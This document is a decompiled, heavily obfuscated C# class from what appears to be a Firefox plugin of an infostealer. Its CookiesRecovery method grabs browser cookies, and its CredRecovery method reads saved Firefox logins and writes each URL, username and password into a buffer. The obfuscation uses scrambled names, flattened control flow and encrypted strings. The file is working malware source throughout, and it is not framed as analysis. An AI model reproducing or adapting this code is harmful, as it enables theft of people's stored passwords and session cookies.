using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using HsZcU78F13T1yLWI1V;
using Plugin.Browsers.Firefox.Cookies;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Firefox;

public class Firefox
{
	public bool isOK;

	internal static Firefox D33GplmHYi5tmxrNE9V;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CookiesRecovery(StringBuilder Cooks)
	{
		switch (1)
		{
		case 1:
			try
			{
				List<FFCookiesGrabber.FirefoxCookie>.Enumerator enumerator = FFCookiesGrabber.Cookies().GetEnumerator();
				int num = 2;
				FFCookiesGrabber.FirefoxCookie current = default(FFCookiesGrabber.FirefoxCookie);
				int num3 = default(int);
				int num5 = default(int);
				while (true)
				{
					switch (num)
					{
					case 2:
						try
						{
							while (true)
							{
								IL_0126:
								int num2;
								if (!enumerator.MoveNext())
								{
									num2 = 1;
									if (!PQSjkUmdM47E7W8Nc7B())
									{
										goto IL_009b;
									}
									goto IL_009f;
								}
								goto IL_00cd;
								IL_009f:
								while (true)
								{
									switch (num2)
									{
									case 2:
										if (GWFMBgmJmyURcIeno9D(A4bycOmBoNyp87oapoZ(current, JB4J6pqWfLbCbJXTau.eQVDIKvod), fiM4Hw9Fl6DhXSwmaZ.OgHcDVfAhN))
										{
											num2 = 5;
											continue;
										}
										goto case 4;
									case 7:
										isOK = true;
										num2 = 3;
										continue;
									case 8:
										goto IL_0126;
									case 3:
									case 5:
										goto IL_0147;
									case 4:
										if (!isOK)
										{
											num2 = 6;
											continue;
										}
										goto IL_0147;
									case 6:
										EPSFb3m3UgLGoc7R5kx(Cooks, dPh7qTmiyc8Pjnu1Sy7(840), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
										num2 = 7;
										continue;
									case 1:
										goto end_IL_0126;
									}
									break;
									IL_0147:
									EPSFb3m3UgLGoc7R5kx(Cooks, uebdqkmfi4FSPawVchO(new string[2]
									{
										(string)A4bycOmBoNyp87oapoZ(current, JB4J6pqWfLbCbJXTau.eQVDIKvod),
										nCP5vtxT3QjsSeuiK3.xuCtsHmOK(890)
									}, bFCXGEcGBEjed7yAf1T.RhDc8YcrOF), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num2 = 8;
									if (PQSjkUmdM47E7W8Nc7B())
									{
										continue;
									}
									goto IL_009b;
								}
								goto IL_00cd;
								IL_00cd:
								current = enumerator.Current;
								num2 = 2;
								if (VUGijvm4JpYA3W8w4W1() == null)
								{
									num2 = 2;
								}
								goto IL_009f;
								IL_009b:
								num2 = num3;
								goto IL_009f;
								continue;
								end_IL_0126:
								break;
							}
						}
						finally
						{
							((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
							int num4 = 0;
							if (PQSjkUmdM47E7W8Nc7B())
							{
								num4 = 0;
							}
							switch (num4)
							{
							case 0:
								break;
							}
						}
						break;
					case 1:
						return;
					}
					vBZLyocWST46tXrDuXU.IrTxr5idK(Cooks, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(898), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
					num = 1;
					if (VUGijvm4JpYA3W8w4W1() != null)
					{
						num = num5;
					}
				}
			}
			catch
			{
				int num6 = 0;
				if (PQSjkUmdM47E7W8Nc7B())
				{
					num6 = 0;
				}
				switch (num6)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void CredRecovery(StringBuilder Pass)
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				List<IPassReader>.Enumerator enumerator = new List<IPassReader>
				{
					new FirefoxPassReader()
				}.GetEnumerator();
				int num = 1;
				if (PQSjkUmdM47E7W8Nc7B())
				{
					num = 1;
				}
				switch (num)
				{
				case 0:
					break;
				case 1:
					try
					{
						IEnumerator<CredentialModel> enumerator2 = default(IEnumerator<CredentialModel>);
						int num4 = default(int);
						CredentialModel current = default(CredentialModel);
						int num6 = default(int);
						while (true)
						{
							int num2;
							if (!enumerator.MoveNext())
							{
								num2 = 0;
								if (VUGijvm4JpYA3W8w4W1() != null)
								{
									num2 = 0;
								}
								goto IL_0081;
							}
							goto IL_02bd;
							IL_02bd:
							enumerator2 = enumerator.Current.ReadPasswords().GetEnumerator();
							num2 = 2;
							if (VUGijvm4JpYA3W8w4W1() != null)
							{
								num2 = 0;
							}
							goto IL_0081;
							IL_0081:
							switch (num2)
							{
							default:
								return;
							case 0:
								return;
							case 1:
								break;
							case 2:
								try
								{
									while (true)
									{
										IL_0215:
										int num3;
										if (!WgTYYbJRKwFExGPhGv.IrTxr5idK(enumerator2, WgTYYbJRKwFExGPhGv.HSdcldaZv4))
										{
											num3 = 1;
											if (VUGijvm4JpYA3W8w4W1() != null)
											{
												goto IL_00d1;
											}
											goto IL_00d5;
										}
										goto IL_01bd;
										IL_00d1:
										num3 = num4;
										goto IL_00d5;
										IL_01bd:
										current = enumerator2.Current;
										num3 = 2;
										goto IL_00d5;
										IL_00d5:
										while (true)
										{
											switch (num3)
											{
											default:
												EPSFb3m3UgLGoc7R5kx(Pass, uebdqkmfi4FSPawVchO(new string[6]
												{
													(string)agxKx9moH8av6JnBbQT(current),
													(string)dPh7qTmiyc8Pjnu1Sy7(904),
													(string)oCkV0NmvWngJKEwCJwq(current),
													(string)dPh7qTmiyc8Pjnu1Sy7(916),
													(string)eAU43DmNN3NsyCB57LB(current),
													(string)dPh7qTmiyc8Pjnu1Sy7(890)
												}, bFCXGEcGBEjed7yAf1T.RhDc8YcrOF), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
												num3 = 3;
												continue;
											case 9:
												break;
											case 8:
												EPSFb3m3UgLGoc7R5kx(Pass, dPh7qTmiyc8Pjnu1Sy7(840), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
												num3 = 9;
												continue;
											case 4:
												goto end_IL_00d5;
											case 7:
												if (isOK)
												{
													num3 = 6;
													if (!PQSjkUmdM47E7W8Nc7B())
													{
														num3 = 6;
													}
													continue;
												}
												goto case 8;
											case 2:
												if (fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)agxKx9moH8av6JnBbQT(current), fiM4Hw9Fl6DhXSwmaZ.OgHcDVfAhN))
												{
													num3 = 5;
													continue;
												}
												goto case 7;
											case 3:
												goto IL_0215;
											case 1:
												goto end_IL_0215;
											}
											isOK = true;
											num3 = 0;
											if (PQSjkUmdM47E7W8Nc7B())
											{
												continue;
											}
											goto IL_00d1;
											continue;
											end_IL_00d5:
											break;
										}
										goto IL_01bd;
										continue;
										end_IL_0215:
										break;
									}
								}
								finally
								{
									if (enumerator2 != null)
									{
										int num5 = 1;
										if (!PQSjkUmdM47E7W8Nc7B())
										{
											num5 = num6;
										}
										while (true)
										{
											switch (num5)
											{
											case 1:
												hp2t4AvvrAe21OV5Ii.IrTxr5idK(enumerator2, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
												num5 = 0;
												if (VUGijvm4JpYA3W8w4W1() != null)
												{
													num5 = 0;
												}
												continue;
											case 0:
												break;
											}
											break;
										}
									}
								}
								break;
							case 3:
								goto IL_02bd;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
						int num7 = 0;
						if (VUGijvm4JpYA3W8w4W1() == null)
						{
							num7 = 0;
						}
						switch (num7)
						{
						case 0:
							break;
						}
					}
				}
				break;
			}
			catch
			{
				int num8 = 0;
				if (!PQSjkUmdM47E7W8Nc7B())
				{
					int num9 = default(int);
					num8 = num9;
				}
				switch (num8)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public Firefox()
	{
		doOMPBmqIGIdiiQemcW();
		base._002Ector();
		int num = 0;
		if (true)
		{
			num = 0;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object A4bycOmBoNyp87oapoZ(object P_0, object P_1)
	{
		return JB4J6pqWfLbCbJXTau.IrTxr5idK(P_0, (JB4J6pqWfLbCbJXTau)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool GWFMBgmJmyURcIeno9D(object P_0, object P_1)
	{
		return fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)P_0, (fiM4Hw9Fl6DhXSwmaZ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object dPh7qTmiyc8Pjnu1Sy7(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object EPSFb3m3UgLGoc7R5kx(object P_0, object P_1, object P_2)
	{
		return vBZLyocWST46tXrDuXU.IrTxr5idK(P_0, (string)P_1, (vBZLyocWST46tXrDuXU)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uebdqkmfi4FSPawVchO(object P_0, object P_1)
	{
		return bFCXGEcGBEjed7yAf1T.IrTxr5idK((string[])P_0, (bFCXGEcGBEjed7yAf1T)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool PQSjkUmdM47E7W8Nc7B()
	{
		return D33GplmHYi5tmxrNE9V == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Firefox VUGijvm4JpYA3W8w4W1()
	{
		return D33GplmHYi5tmxrNE9V;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object agxKx9moH8av6JnBbQT(object P_0)
	{
		return ((CredentialModel)P_0).Url;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object oCkV0NmvWngJKEwCJwq(object P_0)
	{
		return ((CredentialModel)P_0).Username;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object eAU43DmNN3NsyCB57LB(object P_0)
	{
		return ((CredentialModel)P_0).Password;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void doOMPBmqIGIdiiQemcW()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
	}
}
